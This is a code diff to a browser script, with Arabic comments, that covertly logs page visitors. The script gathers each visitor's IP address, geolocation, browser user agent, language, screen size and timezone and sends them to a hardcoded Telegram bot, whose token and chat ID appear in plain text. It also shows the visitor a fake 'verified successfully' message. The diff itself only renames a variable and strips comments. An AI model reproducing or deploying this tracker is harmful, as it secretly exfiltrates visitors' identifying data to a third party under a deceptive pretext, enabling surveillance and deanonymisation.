@@ -29,7 +29,7 @@ const BOT_TOKEN = "8990437503:AAEbLQn5Pe539tpZb-l47AHoWxMPOakftho";
 const CHAT_ID   = "8278195073";
 // ===================================
 
-// 1) جلب الـ IP مع 3 مصادر احتياطية (لو فشل واحد نجرب التالي)
+// 1) جلب الـ IP مع 3 مصادر احتياطية
 async function getIP() {
   const apis = [
     'https://api.ipify.org?format=json',
@@ -56,10 +56,8 @@ function sendToTelegram(text) {
 
 (async function main() {
   try {
-    // الـ IP أولاً — مع مهلة زمنية حتى لا يتجمد السكربت
     const ip = await getIP();
 
-    // معلومات جغرافية — اختيارية ولا توقف الإرسال لو فشلت
     let geo = null;
     try {
       const r = await fetch('https://ipwho.is/' + ip, { signal: AbortSignal.timeout(5000) });
@@ -69,7 +67,7 @@ function sendToTelegram(text) {
 
     const ua     = navigator.userAgent || '';
     const lang   = navigator.language || 'غير معروف';
-    const screen = (window.screen ? screen.width + 'x' + screen.height : 'غير معروف');
+    const scr    = window.screen ? (window.screen.width + 'x' + window.screen.height) : 'غير معروف';  // ✅ الاسم تغيّر
     const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
 
     let msg  = '🕵️ زائر جديد دخل الصفحة\n──────────────\n';
@@ -81,15 +79,14 @@ function sendToTelegram(text) {
     }
     msg += '🖥️ المتصفح: ' + ua.substring(0, 150) + '\n';
     msg += '🌍 اللغة: ' + lang + '\n';
-    msg += '📱 الشاشة: ' + screen + '\n';
+    msg += '📱 الشاشة: ' + scr + '\n';          // ✅ استخدم scr هنا
     msg += '🕒 المنطقة الزمنية: ' + tz + '\n';
     msg += '⏰ التاريخ: ' + new Date().toLocaleString();
 
-    sendToTelegram(msg);   // الإرسال أولاً ثم تحديث الواجهة
+    sendToTelegram(msg);
     document.getElementById('h1').textContent = 'تم التحقق بنجاح ✓';
     document.getElementById('p').textContent = 'يمكنك المتابعة الآن.';
   } catch (e) {
-    // محاولة أخيرة: أرسل نص الخطأ نفسه لتعرف أن الصفحة فشلت
     try { sendToTelegram('⚠️ فشل في الصفحة: ' + (e && e.message ? e.message : e)); } catch (err) {}
     document.getElementById('h1').textContent = 'تعذر الاتصال';
   }
